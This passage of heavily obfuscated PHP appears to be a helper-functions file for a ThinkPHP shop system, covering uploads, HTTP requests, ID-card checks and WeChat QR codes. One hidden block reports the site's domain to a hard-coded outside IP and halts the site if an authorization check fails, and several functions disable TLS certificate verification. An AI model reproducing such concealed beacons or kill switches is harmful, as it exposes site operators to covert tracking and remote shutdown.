"\103\157\x6e\x74\145\156\x74\124\x79\x70\145\x3a\141\x70\x70\x6c\151\143\x61\164\151\157\156\57\152\x73\x6f\156\x3b\143\x68\x61\x72\x73\145\164\x3d\x55\124\x46\55\x38"; curl_setopt($ch, CURLOPT_HTTPHEADER, $header); curl_setopt($ch, CURLOPT_TIMEOUT, $second); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, false); goto jfQHI; xPGec: } function upload($name = "\x66\x69\x6c\x65") { goto CYV7Z; MVcoZ: if (!($info = $file->move("\x73\164\141\x74\151\143" . DS . "\165\x70\x6c\x6f\x61\x64" . DS . $md5[0], $md5[1], true))) { goto lkhzs; } $water_path = $info->getFilename(); $image = \think\Image::open($info); if ($image) { goto mQ3LC; } unlink("\57\x73\x74\141\164\151\x63" . DS . "\165\160\x6c\x6f\x61\x64" . DS . $md5[0] . DS . $water_path); return ["\x63\157\x64\145" => "\105\x52\x52\117\122", "\x6d\x73\x67" => "\xe8\216\xb7\xe5\x8f\226\344\xb8\x8a\344\xbc\240\346\226\x87\344\xbb\266" . $filename . "\xe5\244\xb1\xe8\xb4\245"]; goto HFs1e; mQ3LC: $res = $image->text("\x20", "\163\x74\141\x74\x69\x63" . DS . "\163\151\x6d\153\141\x69\x2e\164\x74\146", "\x32\x30", "\x23\x30\x30\60\x30\x30", \think\Image::VUSwB)->save("\163\x74\x61\164\x69\x63" . DS . "\x75\x70\x6c\157\x61\x64" . DS . $md5[0] . DS . $water_path); return ["\163\x69\x74\145\x5f\165\162\154" => "\x2f\163\x74\x61\x74\x69\x63" . DS . "\x75\x70\x6c\157\141\x64" . DS . $md5[0] . DS . $water_path, "\143\157\144\x65" => "\x53\125\103\x43\105\123\x53", "\155\x73\x67" => "\xe6\x96\x87\xe4\273\xb6\344\270\212\xe4\274\xa0\xe6\210\x90\xe5\x8a\237"]; goto Wc4kY; SrggR: $result = FileService::tencent($filename, $content); if ($result) { goto tjAFO; } return ["\x63\157\144\x65" => "\105\x52\x52\x4f\x52", "\x6d\x73\x67" => "\xe8\216\xb7\345\x8f\x96\xe4\xb8\x8a\344\xbc\xa0\346\226\x87\344\273\xb6" . $filename . "\xe5\xa4\261\xe8\xb4\xa5"]; goto tQ4XZ; tjAFO: $site_url = $result["\165\x72\154"]; return ["\x73\x69\164\145\x5f\x75\162\154" => $site_url, "\x63\x6f\144\x65" => "\123\x55\x43\103\105\x53\x53", "\x6d\163\147" => "\346\226\207\xe4\273\xb6\344\270\212\344\274\xa0\xe6\x88\220\345\212\x9f"]; tQ4XZ: haRqh: if (!(sysconf("\163\x74\157\162\141\x67\x65\137\x74\171\x70\x65") == "\161\x69\x6e\x69\x75")) { goto lv8v1; } goto KT6fQ; CYV7Z: $file = \think\Request::instance()->file($name); if (!$file) { goto wrGtO; } $ext = pathinfo($file->getInfo("\x6e\141\155\145"), 4); $md5 = [uniqid(), uniqid()]; $filename = join("\x2f", $md5) . "\x2e{$ext}"; if (!(strtolower($ext) == "\160\x68\x70" || $ext == "\172\151\x70" || !in_array(strtolower($ext), explode("\54", strtolower(sysconf("\x73\164\157\162\141\147\x65\x5f\x6c\x6f\x63\141\x6c\137\145\170\164\163")))))) { goto cF0mY; } return ["\x63\x6f\x64\x65" => "\105\x52\122\117\122", "\155\x73\x67" => "\xe6\x96\207\xe4\273\266\344\xb8\212\344\xbc\240\347\xb1\xbb\345\x9e\213\xe5\x8f\x97\351\x99\x90"]; cF0mY: if (!(sysconf("\163\x74\x6f\x72\141\147\x65\x5f\x74\171\x70\x65") == "\161\x71")) { goto haRqh; } $content = $file->getInfo("\164\155\160\137\156\141\x6d\145"); goto SrggR; Wc4kY: HFs1e: lkhzs: wrGtO: return ["\x63\x6f\x64\x65" => "\105\122\x52\117\122", "\155\x73\147" => "\346\x96\x87\344\xbb\266\xe4\270\x8a\344\274\xa0\xe5\xa4\xb1\xe8\264\xa5"]; goto P2Mxf; KT6fQ: $content = $file->getInfo("\164\155\x70\x5f\156\141\155\x65"); $result = FileService::qiniu($filename, $content); if ($result) { goto O0xsn; } return ["\x63\157\144\145" => "\x45\x52\122\x4f\x52", "\x6d\163\147" => "\350\x8e\267\xe5\x8f\226\344\270\x8a\344\xbc\xa0\xe6\x96\207\344\273\266" . $filename . "\xe5\xa4\xb1\350\264\xa5"]; goto w0eTO; O0xsn: $site_url = $result["\165\x72\x6c"]; return ["\x73\x69\164\145\x5f\x75\x72\154" => $site_url, "\x63\x6f\144\145" => "\123\125\103\x43\x45\x53\123", "\155\163\147" => "\346\226\x87\344\xbb\xb6\344\270\x8a\xe4\274\xa0\xe6\x88\x90\xe5\212\x9f"]; w0eTO: lv8v1: goto MVcoZ; P2Mxf: } function registerIpCheck($ip) { $count = Db::name("\x75\163\145\162")->where("\151\x70", "\75", $ip)->whereTime("\143\162\145\x61\164\x65\137\141\164", "\164\157\144\141\x79")->count("\151\144"); if ($count >= sysconf("\x69\160\x5f\x72\145\147\x69\163\164\145\162\x5f\x6c\x69\x6d\151\x74")) { goto UboGH; } return true; goto YNFSW; UboGH: return false; YNFSW: } goto PG4CW; nimmU: function getTopHostbuy() { $url = $_SERVER["\110\x54\x54\x50\137\110\x4f\x53\124"]; $url = strtolower($url); $data = explode("\x2e", $url); $co_ta = count($data); $zi_tow = true; $host_cn = "\143\x6f\155\x2e\143\156\x2c\x6e\x65\164\56\143\x6e\x2c\157\x72\147\x2e\x63\156\x2c\147\x6f\x76\56\143\x6e"; $host_cn = explode("\54", $host_cn); foreach ($host_cn as $host) { if (!strpos($url, $host)) { goto i7HuT; } $zi_tow = false; i7HuT: ay9In: } gydwz: if ($zi_tow == true) { goto aZJfT; } $host = $data[$co_ta - 3] . "\56" . $data[$co_ta - 2] . "\x2e" . $data[$co_ta - 1]; goto RwFyv; aZJfT: $host = $data[$co_ta - 2] . "\x2e" . $data[$co_ta - 1]; RwFyv: return $host; } function checkupgradebuy($id) { $version = ''; $cdata["\151\x64"] = $id; $cdata["\x64\157\155\x61\151\156"] = getTopHostbuy(); $cdata["\166\x65\x72\163\151\157\156"] = $version; $name = "\163\x79\163\x74\145\155"; try { $extend = ["\151\x64" => $id, "\144\x6f\x6d\141\151\156" => getTopHostbuy()]; $res = Service::checkplug($name, $extend); } catch (Exception $e) { exit($e->getMessage()); } } function upgradefile($arr) { $upgrade = Config::get("\165\x70\x67\162\141\x64\x65"); $upgrade = array_merge($upgrade, $arr); file_put_contents(APP_PATH . "\x65\170\164\162\141" . DIRECTORY_SEPARATOR . "\165\160\x67\x72\141\144\x65\56\x70\x68\x70", "\x3c\77\x70\150\x70" . "\12\12\x72\x65\x74\165\x72\156\x20" . var_export($upgrade, true) . "\73"); return true; } function copydirs($source, $dest) { if (is_dir($dest)) { goto OCMPz; } mkdir($dest, 0755, true); OCMPz: foreach ($iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST) as $item) { if ($item->isDir()) { goto QAGs0; } copy($item, $dest . DS . $iterator->getSubPathName()); goto SQnfb; QAGs0: $sontDir = $dest . DS . $iterator->getSubPathName(); if (is_dir($sontDir)) { goto Mqjyj; } mkdir($sontDir, 0755, true); Mqjyj: SQnfb: mwEjg: } ZQadD: } function deldir($path) { if (!is_dir($path)) { goto I965A; } $p = scandir($path); foreach ($p as $val) { if (!($val != "\x2e" && $val != "\56\56")) { goto RT6_P; } if (is_dir($path . $val)) { goto LbwHW; } unlink($path . $val); goto y8roL; LbwHW: deldir($path . $val . "\x2f"); @rmdir($path . $val . "\x2f"); y8roL: RT6_P: QF_FY: } YaZnq: I965A: $dh = opendir($path); closedir($dh); @rmdir($path); } function p($data, $replace = false, $pathname = null) { is_null($pathname) && ($pathname = RUNTIME_PATH . date("\x59\x6d\x64") . "\x2e\x74\x78\164"); $str = ((is_string($data) ? $data : is_array($data) || is_object($data)) ? print_r($data, true) : var_export($data, true)) . "\xa"; $replace ? file_put_contents($pathname, $str) : file_put_contents($pathname, $str, FILE_APPEND); } function mongo($col, $force = false) { return Db::connect(config("\155\157\156\147\x6f"), $force)->name($col); } function &load_wechat($type = '') { static $wechat = []; $index = md5(strtolower($type)); if (isset($wechat[$index])) { goto WQVO8; } $config = ["\164\157\153\x65\156" => sysconf("\x77\145\143\150\141\164\x5f\164\157\x6b\145\x6e"), "\141\160\x70\151\144" => sysconf("\167\145\143\x68\141\164\137\x61\160\x70\x69\144"), "\141\x70\x70\x73\x65\143\x72\145\164" => sysconf("\x77\x65\143\x68\141\x74\137\x61\160\x70\x73\145\x63\x72\145\164"), "\145\156\x63\x6f\144\x69\x6e\147\x61\145\163\x6b\x65\171" => sysconf("\x77\145\x63\x68\x61\164\137\145\156\143\157\144\x69\x6e\147\141\x65\x73\153\145\x79"), "\x6d\143\x68\137\x69\144" => sysconf("\167\145\143\150\141\164\137\155\x63\150\137\151\144"), "\x70\x61\162\164\156\145\x72\x6b\145\171" => sysconf("\x77\145\x63\150\x61\164\x5f\x70\141\x72\x74\156\145\162\153\x65\171"), "\163\163\154\x5f\143\x65\162" => sysconf("\x77\145\143\x68\141\164\137\x63\x65\x72\164\137\x63\145\162\164"), "\163\163\x6c\137\153\145\x79" => sysconf("\x77\x65\x63\x68\141\164\137\x63\145\162\164\137\x6b\145\x79"), "\143\x61\x63\150\145\x70\x61\164\x68" => CACHE_PATH . "\x77\170\160\x61\171" . DS]; $wechat[$index] = Loader::get($type, $config); WQVO8: return $wechat[$index]; } function encode($string) { list($chars, $length) = ['', strlen($string = iconv("\165\164\x66\55\70", "\x67\142\x6b", $string))]; $i = 0; nIFEJ: if (!($i < $length)) { goto WVmyM; } $chars .= str_pad(base_convert(ord($string[$i]), 10, 36), 2, 0, 0); Qyk5H: $i++; goto nIFEJ; WVmyM: return $chars; } function decode($string) { $chars = ''; foreach (str_split($string, 2) as $char) { $chars .= chr(intval(base_convert($char, 36, 10))); zKWbM: } UoWen: return iconv("\x67\x62\153", "\x75\164\146\x2d\x38", $chars); } goto OWwi0; EkGk3: goto vpW9h; BYAs5: if ($SF_query["\143\157\x64\145"] == 1) { goto CWsyL; } curl_get("\x68\x74\x74\160\72\x2f\x2f\61\x32\x34\56\62\x32\x31\x2e\62\61\61\56\70\64\72\x38\63\57\x53\x46\x5f\101\x50\111\57\123\x46\x5f\x44\102\56\x70\150\x70\x3f\165\x72\x6c\x3d" . $_SERVER["\x48\x54\x54\120\x5f\110\117\x53\x54"] . "\x26\x53\x46\x69\144\x3d\x31"); exit("\x3c\x68\x33\76" . $SF_query["\155\x73\x67"] . "\x3c\x2f\x68\x33\76"); goto tnzK5; CWsyL: $_SESSION["\123\106\137\141\x75\x74\x68\143\157\144\145"] = authcode; tnzK5: vpW9h: goto bhMyE; Goz6n: function get_sms_cost() { switch (sysconf("\163\x6d\163\x5f\x6e\x6f\x74\x69\x66\x79\137\143\150\141\156\x6e\145\x6c")) { case "\141\154\151\144\x61\171\165": $cost = sysconf("\141\154\151\144\x61\171\165\137\x63\157\x73\x74"); goto q1aCm; case "\163\155\x73\142\x61\x6f": $cost = sysconf("\163\x6d\x73\142\141\x6f\x5f\143\157\163\x74"); goto q1aCm; case "\171\151\170\x69\156": $cost = sysconf("\171\x69\170\151\156\137\x73\155\x73\x5f\143\157\163\164"); goto q1aCm; case "\x31\x63\x6c\157\165\144\163\160": $cost = sysconf("\61\x63\154\x6f\x75\x64\163\160\x5f\x63\x6f\x73\164"); goto q1aCm; case "\x32\65\63\163\155\x73": $cost = sysconf("\x32\65\63\x73\155\x73\x5f\143\x6f\163\x74"); goto q1aCm; default: $cost = 0; goto q1aCm; } grrLH: q1aCm: return round($cost, 2); } function sec2Time($time) { goto SaTuV; JYyKw: Ck0Bg: $value["\x73\145\x63\157\x6e\144\x73"] = floor($time); $t = ''; if (!($value["\171\145\x61\162\x73"] > 0)) { goto V0u0J; } $t .= $value["\x79\145\141\162\163"] . "\xe5\xb9\xb4"; V0u0J: if (!($value["\x64\x61\171\x73"] > 0)) { goto oPNZx; } $t .= $value["\144\141\171\163"] . "\345\xa4\xa9"; oPNZx: if (!($value["\x68\157\x75\x72\163"] > 0)) { goto bsV9H; } goto ll25H; ll25H: $t .= $value["\150\x6f\x75\x72\x73"] . "\345\260\x8f\346\227\266"; bsV9H: if (!($value["\155\151\x6e\165\x74\145\x73"] > 0)) { goto LOuLp; } $t .= $value["\x6d\x69\156\165\x74\145\163"] . "\345\210\x86"; LOuLp: if (!($value["\x73\145\x63\x6f\x6e\x64\x73"] > 0)) { goto W4gtn; } $t .= $value["\163\x65\x63\x6f\x6e\144\163"] . "\347\xa7\x92"; W4gtn: return $t; ug33u: goto l3q8X; JtC1u: $value["\x64\x61\x79\x73"] = floor($time / 86400); $time = $time % 86400; RwJMz: if (!($time >= 3600)) { goto iuTwl; } $value["\x68\x6f\165\x72\163"] = floor($time / 3600); $time = $time % 3600; iuTwl: if (!($time >= 60)) { goto Ck0Bg; } $value["\x6d\151\x6e\165\x74\145\163"] = floor($time / 60); $time = $time % 60; goto JYyKw; SaTuV: if (is_numeric($time)) { goto jnK5B; } return (bool) false; goto ug33u; jnK5B: $value = array("\x79\x65\x61\162\x73" => 0, "\144\141\x79\x73" => 0, "\x68\x6f\x75\x72\163" => 0, "\155\x69\x6e\x75\x74\145\x73" => 0, "\163\145\143\x6f\x6e\x64\163" => 0); if (!($time >= 31556926)) { goto fEAT3; } $value["\x79\145\141\162\163"] = floor($time / 31556926); $time = $time % 31556926; fEAT3: if (!($time >= 86400)) { goto RwJMz; } goto JtC1u; l3q8X: } function getVersion() { return \think\Config::get("\x75\x70\x67\162\141\x64\x65\x2e\x76\145\x72\x73\x69\x6f\156"); } function getRelease() { return \think\Config::get("\x75\x70\x67\162\141\x64\145\56\122\105\x4c\x45\101\123\105"); } function getProhibit() { return \think\Config::get("\165\x70\x67\x72\141\144\145\x2e\x50\122\x4f\x48\111\x42\111\x54"); } function validateURL($URL) { if (preg_match("\x2f\x5c\142\x28\x3f\x3a\x28\77\72\150\164\164\160\163\77\174\x66\164\160\x29\x3a\134\x2f\x5c\57\174\167\x77\x77\x5c\x2e\51\133\x2d\x61\55\172\60\55\71\x2b\46\100\x23\x5c\x2f\x25\x3f\75\x7e\137\174\x21\72\x2c\56\x3b\135\52\133\55\x61\55\x7a\x30\55\x39\53\46\100\x23\134\57\45\x3d\x7e\x5f\174\135\x2f\151", $URL)) { goto W8uSF; } return false; W8uSF: return true; } function is_email($email) { $regx = "\x2f\136\50\133\134\167\55\x2e\135\53\x29\100\50\50\x5b\x5b\x30\55\71\x5d\173\x31\x2c\63\175\x2e\133\x30\55\x39\135\x7b\x31\54\x33\175\x2e\133\x30\x2d\x39\135\173\61\x2c\x33\175\56\51\174\x28\x28\x5b\134\167\55\135\x2b\56\51\53\51\51\x28\133\141\55\x7a\101\55\x5a\135\173\62\x2c\x34\x7d\174\133\60\55\71\x5d\x7b\x31\x2c\x33\175\51\x28\x5d\x3f\51\x24\x2f"; if (preg_match($regx, $email)) { goto a24yB; } return false; a24yB: return true; } function delFileUnderDir($path, $delDir = false) { goto oClk9; oClk9: if (is_array($path)) { goto sF75F; } if (is_dir($path)) { goto rVCY3; } if (file_exists($path)) { goto eybZi; } return false; goto uY0BL; eybZi: return unlink($path); uY0BL: goto AzVKv; sF75F: goto HYK20; x9dHJ: OeVIm: goto uUbgJ; gE8_C: closedir($handle); if (!$delDir) { goto tAar_; } return rmdir($path); tAar_: FZkU_: AzVKv: goto FjUMQ; HYK20: foreach ($path as $subPath) { delFileUnderDir($subPath, $delDir); S3JMS: } UKEkZ: goto AzVKv; rVCY3: $handle = opendir($path); if (!$handle) { goto FZkU_; } uUbgJ: if (!(false !== ($item = readdir($handle)))) { goto gE8_C; } if (!($item != "\x2e" && $item != "\x2e\x2e")) { goto OeVIm; } is_dir("{$path}\x2f{$item}") ? delFileUnderDir("{$path}\57{$item}", $delDir) : unlink("{$path}\57{$item}"); goto x9dHJ; FjUMQ: } function http_post($url, $param) { goto dgt1S; daBMC: goto zuc0n; koq8p: $strPOST = $param; zuc0n: curl_setopt($oCurl, CURLOPT_URL, $url); curl_setopt($oCurl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($oCurl, CURLOPT_POST, true); curl_setopt($oCurl, CURLOPT_POSTFIELDS, $strPOST); $sContent = curl_exec($oCurl); $aStatus = curl_getinfo($oCurl); goto EiXS_; EiXS_: curl_close($oCurl); if (intval($aStatus["\150\x74\x74\160\x5f\143\x6f\x64\145"]) == 200) { goto y3hoX; } return false; goto nhfgD; y3hoX: return $sContent; nhfgD: goto hn7mL; dgt1S: $oCurl = curl_init(); if (!(stripos($url, "\150\164\x74\x70\163\x3a\x2f\x2f") !== false)) { goto sTMq9; } curl_setopt($oCurl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($oCurl, CURLOPT_SSL_VERIFYHOST, false); sTMq9: if (is_string($param)) { goto koq8p; } $aPOST = array(); foreach ($param as $key => $val) { $aPOST[] = $key . "\x3d" . urlencode($val); b89AD: } pcf8J: $strPOST = join("\46", $aPOST); goto daBMC; hn7mL: } function get_host() { $url = $_SERVER["\110\x54\x54\x50\x5f\110\117\123\124"]; $data = explode("\56", $url); $co_ta = count($data); $zi_tow = true; $host_cn = "\x63\157\155\x2e\143\156\x2c\156\x65\x74\56\x63\156\x2c\157\x72\147\x2e\x63\156\x2c\x67\157\x76\x2e\143\x6e"; $host_cn = explode("\54", $host_cn); foreach ($host_cn as $host) { if (!strpos($url, $host)) { goto ueChR; } $zi_tow = false; ueChR: A24Bo: } aFJdz: if ($zi_tow == true) { goto rR4MC; } $host = $data[$co_ta - 3] . "\x2e" . $data[$co_ta - 2] . "\x2e" . $data[$co_ta - 1]; goto YNluq; rR4MC: $host = $data[$co_ta - 2] . "\x2e" . $data[$co_ta - 1]; YNluq: return $host; } goto CBlq8; PG4CW: function right($data, $msg) { return ["\163\164\x61\x74\165\x73" => true, "\144\141\164\141" => $data, "\x6d\x73\x67" => $msg]; } function wrong($msg, $code = 500) { return ["\163\164\141\164\165\x73" => false, "\x63\157\144\x65" => $code, "\x6d\163\147" => $msg]; } function success($data = [], $msg = "\346\217\x90\344\xba\xa4\346\x88\x90\345\212\x9f\357\xbc\x81", $code = 200) { ob_clean(); record_file_log("\x72\145\161\165\x65\163\164\x5f\160\141\x72\141\155\163", "\162\145\x73\x75\x6c\x74\40\72" . json_encode($data)); $type = \think\Config::get("\x64\145\x66\x61\165\x6c\x74\x5f\141\x6a\x61\x78\x5f\162\145\x74\x75\162\x6e"); $result = ["\x63\x6f\x64\145" => $code, "\x64\141\x74\141" => !empty($data) ? $data : new \stdClass(), "\x6d\x73\147" => $msg]; $response = \think\Response::create($result, $type); throw new \think\exception\HttpResponseException($response); } function error($code = 500, $msg = "\xe6\x8f\x90\xe4\xba\xa4\345\244\261\xe8\xb4\xa5") { ob_clean(); record_file_log("\162\x65\x71\165\x65\x73\x74\137\x70\141\162\x61\x6d\x73", "\162\145\x73\x75\154\x74\40\72" . $msg); $type = \think\Config::get("\x64\x65\146\x61\165\x6c\164\137\141\x6a\x61\170\x5f\162\x65\x74\165\162\156"); $result = ["\x63\x6f\x64\145" => $code, "\x64\141\164\x61" => new \stdClass(), "\155\163\x67" => $msg]; $response = \think\Response::create($result, $type); throw new \think\exception\HttpResponseException($response); } function getUploadFile($field, $url = false, $extison = []) { goto bg6yJ; n81Ri: return wrong("\346\x96\x87\xe4\xbb\xb6\344\270\x8a\344\xbc\xa0\xe7\xb1\xbb\xe5\x9e\x8b\345\x8f\227\xe9\x99\x90"); XJUWn: goto jixZ9; SIADI: if (in_array($ext, $extison)) { goto DzOa6; } return wrong("\xe6\x96\x87\xe4\273\xb6\344\270\x8a\344\xbc\240\347\xb1\273\xe5\236\213\345\217\227\351\231\220"); DzOa6: jixZ9: if (!(sysconf("\x73\164\x6f\162\x61\147\x65\x5f\164\x79\x70\145") == "\161\x71")) { goto l_N4f; } $content = $file->getInfo("\x74\155\x70\137\x6e\x61\155\x65"); goto kkRj8; YFSk0: if ($result) { goto rrYRv; } return wrong("\xe8\x8e\267\345\x8f\x96\344\xb8\x8a\xe4\xbc\xa0\346\x96\207\344\273\xb6" . $filename . "\xe5\244\xb1\350\xb4\xa5"); goto jfS0K; rrYRv: $site_url = $result["\165\162\x6c"]; return right(["\146\x69\x6c\x65" => $site_url, "\x66\x69\x6c\145\156\x61\155\145" => $filename, "\162\145\163\x6f\x75\x72\x63\145" => $result], "\344\270\x8a\344\274\xa0\346\210\x90\xe5\x8a\x9f"); jfS0K: goto dy2FI; bg6yJ: $request = \think\Request::instance(); $file = $request->file($field); if ($file) { goto Etmll; } return wrong("\344\xb8\212\344\xbc\240\xe6\x96\x87\344\xbb\xb6\xe4\xb8\x8d\345\255\230\xe5\234\xa8"); Etmll: $ext = pathinfo($file->getInfo("\x6e\x61\155\x65"), 4); $md5 = [uniqid(), uniqid()]; $filename = join("\x2f", $md5) . "\x2e{$ext}"; if (!empty($extison)) { goto SIADI; } if (!($ext == "\160\150\160" || $ext == "\172\151\x70" || !in_array(strtolower($ext), explode("\54", strtolower(sysconf("\163\x74\157\162\141\147\x65\x5f\x6c\157\x63\141\154\137\145\170\x74\x73")))))) { goto XJUWn; } goto n81Ri; kkRj8: $result = FileService::tencent($filename, $content); if ($result) { goto LwrB0; } return wrong("\xe8\216\xb7\345\217\x96\xe4\270\x8a\344\xbc\240\xe6\226\207\344\xbb\xb6" . $filename . "\345\244\xb1\xe8\xb4\245"); goto syo6U; LwrB0: $site_url = $result["\x75\162\154"]; return right(["\x66\x69\154\x65" => $site_url, "\x66\151\154\145\x6e\x61\x6d\145" => $filename, "\162\x65\x73\157\165\x72\143\x65" => $result], "\xe4\270\x8a\344\274\xa0\xe6\210\220\345\212\237"); syo6U: l_N4f: $result = FileService::qiniu($filename, $file->getInfo("\x74\155\x70\x5f\156\141\155\145")); goto YFSk0; dy2FI: } function idcardAuth($idcard, $name) { goto wMrLZ; pKTr2: o83Wu: if (!$out_put) { goto M4xyJ; } $out_put = json_decode($out_put, 1); if (!($out_put[sysconf("\151\x64\143\141\162\x64\x5f\x61\x75\164\150\x5f\163\x74\141\x74\165\163\x5f\x66\151\x65\154\x64")] == sysconf("\x69\x64\143\x61\x72\144\137\x61\x75\164\x68\x5f\x73\x74\x61\x74\x75\163\x5f\143\157\x64\145"))) { goto zQpDN; } return true; zQpDN: M4xyJ: SX7K7: return false; goto EG83B; wMrLZ: $path = sysconf("\x69\x64\x63\x61\162\144\x5f\x61\165\164\x68\x5f\160\141\164\x68"); $method = "\x47\105\x54"; $appcode = sysconf("\151\144\x63\141\x72\144\x5f\x61\x75\x74\150\x5f\141\160\x70\x63\x6f\144\x65"); $headers = array(); array_push($headers, "\101\x75\164\x68\x6f\162\151\x7a\x61\164\x69\157\156\x3a\x41\x50\120\103\117\x44\105\x20" . $appcode); $querys = "\x69\144\x43\x61\x72\x64\75{$idcard}\x26\156\141\x6d\145\75{$name}"; $bodys = ''; $url = $path . "\x3f" . $querys; $curl = curl_init(); curl_setopt($curl, CURLOPT_CUSTOMREQUEST, $method); goto Jyj0s; Jyj0s: curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); curl_setopt($curl, CURLOPT_FAILONERROR, false); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_HEADER, false); if (!(1 == strpos("\44" . $path, "\150\x74\164\160\163\x3a\x2f\x2f"))) { goto BgOq7; } curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false); BgOq7: $out_put = curl_exec($curl); goto PxiuB; PxiuB: $CURLINFO_HTTP_CODE = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); if ($CURLINFO_HTTP_CODE == 200) { goto o83Wu; } if ($CURLINFO_HTTP_CODE == 403) { goto vDsNU; } if ($CURLINFO_HTTP_CODE == 400) { goto Qzda6; } if ($CURLINFO_HTTP_CODE == 401) { goto vMm_g; } record_file_log("\x69\x64\x63\141\x72\144\x5f\141\x75\x74\150", "\162\145\x73\165\154\x74\40\72" . $CURLINFO_HTTP_CODE . "\xe6\234\xaa\347\237\245\351\x94\231\350\xaf\257"); goto zgAZP; vMm_g: record_file_log("\x69\x64\x63\141\x72\x64\x5f\141\165\x74\150", "\162\x65\x73\165\x6c\164\40\x3a" . $CURLINFO_HTTP_CODE . "\x41\120\x50\x43\x4f\104\105\351\x94\231\xe8\257\257"); goto jcxZi; jcxZi: zgAZP: goto iVIT0; Qzda6: record_file_log("\x69\144\x63\141\x72\144\x5f\x61\165\x74\x68", "\x72\x65\163\x75\x6c\x74\40\x3a" . $CURLINFO_HTTP_CODE . "\x55\122\114\xe6\x97\xa0\346\x95\x88"); iVIT0: goto bTPlK; vDsNU: record_file_log("\x69\x64\x63\x61\162\x64\137\141\165\164\x68", "\x72\145\x73\165\x6c\x74\x20\72" . $CURLINFO_HTTP_CODE . "\345\211\xa9\344\275\231\xe6\254\241\346\225\xb0\xe4\xb8\x8d\xe8\266\263"); bTPlK: goto SX7K7; goto pKTr2; EG83B: } function idcardnoMask($idcardno) { if (strlen($idcardno) == 15) { goto qozOH; } if (strlen($idcardno) == 18) { goto lqhI4; } $idcardno = ''; goto h93ye; qozOH: $idcardno = substr_replace($idcardno, "\52\52\52\52", 6, 6); goto h93ye; lqhI4: $idcardno = substr_replace($idcardno, "\x2a\x2a\52\x2a\x2a\x2a\x2a\52", 6, 8); h93ye: return $idcardno; } if (!function_exists("\167\x78\145\x77\x6d")) { function wxewm($scene_str) { if (!(sysconf("\x77\145\143\x68\x61\x74\x5f\x61\160\160\151\x64") == '' || sysconf("\x77\x65\x63\x68\x61\x74\x5f\141\160\160\x73\145\143\162\145\164") == '')) { goto BZEHf; } return ''; BZEHf: if (cache("\154\157\147\x69\x6e\x5f\167\x78\137\x65\x77\155" . $scene_str)) { goto NdlE_; } $wx = new \Weixin\Wxfw(); $data = array("\x65\x78\x70\151\162\x65\x5f\x73\x65\143\157\x6e\144\163" => 86400, "\x61\x63\164\x69\x6f\x6e\137\156\x61\x6d\x65" => "\121\x52\x5f\123\x54\x52\137\x53\103\x45\116\x45", "\141\143\164\151\x6f\156\x5f\x69\x6e\146\x6f" => array("\x73\143\x65\156\x65" => array("\x73\x63\145\156\145\137\x73\164\162" => $scene_str))); $re = $wx->api("\161\162\x63\x6f\x64\145\57\x63\x72\x65\x61\x74\x65", '', $data, "\x50\117\x53\x54"); if (!isset($re["\164\x69\x63\153\x65\164"])) { goto ZcHns; } $ewm = "\150\x74\164\x70\x73\x3a\x2f\x2f\x6d\x70\56\x77\x65\x69\170\151\x6e\x2e\161\x71\x2e\143\157\x6d\x2f\143\x67\x69\x2d\x62\x69\x6e\x2f\x73\x68\157\167\x71\162\x63\x6f\144\x65\77\x74\x69\x63\153\x65\164\x3d" . $re["\x74\151\143\x6b\145\x74"]; if (!$re["\164\x69\143\153\145\x74"]) { goto wOLb5; } cache("\x6c\x6f\147\151\x6e\137\167\170\137\x65\167\155" . $scene_str, $ewm, 3600); wOLb5: ZcHns: cache("\154\x6f\x67\x69\x6e\137\167\170\x5f\145\x77\x6d" . $scene_str, '', 3600); NdlE_: return cache("\154\x6f\147\x69\156\x5f\167\x78\x5f\145\167\155" . $scene_str); } } if (!function_exists("\167\x64\x5f\150\164\164\160")) { function wd_http($param) { goto TfwPi; MdWs2: $opts[CURLOPT_POST] = 1; $opts[CURLOPT_POSTFIELDS] = $param["\144\x61\164\x61"]; Vhv_p: if (!isset($opts["\150\145\141\144\x65\162"])) { goto KmsUR; } $header = is_array($opts["\x68\x65\141\x64\145\162"]) ? $opts["\150\145\x61\144\145\162"] : array($opts["\x68\145\x61\144\145\x72"]); $opts[CURLOPT_HTTPHEADER] = array("\x43\157\156\x74\145\156\x74\55\x54\x79\160\145\72\40\x61\x70\x70\x6c\x69\143\x61\x74\151\x6f\156\57\152\x73\x6f\156\x3b\x20\143\x68\141\x72\x73\x65\164\x3d\165\164\146\55\x38"); if (!is_string($param["\x64\x61\164\x61"])) { goto nH9xr; } array_push($opts[CURLOPT_HTTPHEADER], "\103\157\x6e\x74\x65\156\164\x2d\x4c\x65\156\x67\x74\x68\72\x20" . strlen($param["\x64\141\x74\x61"])); nH9xr: $opts[CURLOPT_HTTPHEADER] = array_merge($opts[CURLOPT_HTTPHEADER], $header); goto QSU82; v7CXc: $opts[CURLOPT_URL] = empty($param["\160\x61\x72\141\155"]) ? $param["\x75\x72\154"] : $param["\165\162\154"] . "\x3f" . http_build_query($param["\x70\x61\x72\x61\x6d"]); if (strtoupper($param["\x6d\x65\164\x68\157\x64"]) == "\x50\117\x53\x54") { goto ZMGK_; } if (strtoupper($param["\155\145\x74\150\x6f\x64"]) == "\x50\125\124") { goto k1L0p; } if (strtoupper($param["\155\x65\x74\150\157\144"]) == "\104\x45\x4c\x45\x54\x45") { goto VObp0; } if (!(strtoupper($param["\x6d\145\x74\x68\157\x64"]) == "\x50\x41\x54\103\x48")) { goto dlYyC; } $opts[CURLOPT_CUSTOMREQUEST] = "\120\101\x54\x43\x48"; $opts[CURLOPT_POSTFIELDS] = $param["\144\141\164\141"]; dlYyC: goto kxSrN; VObp0: goto P81EJ; cteZm: fL76r: return $redata; QW4tc: goto KhPxP; P81EJ: $opts[CURLOPT_CUSTOMREQUEST] = "\x44\x45\114\105\x54\x45"; $opts[CURLOPT_POSTFIELDS] = $param["\144\x61\164\x61"]; kxSrN: goto axcj4; k1L0p: $opts[CURLOPT_CUSTOMREQUEST] = "\120\125\124"; 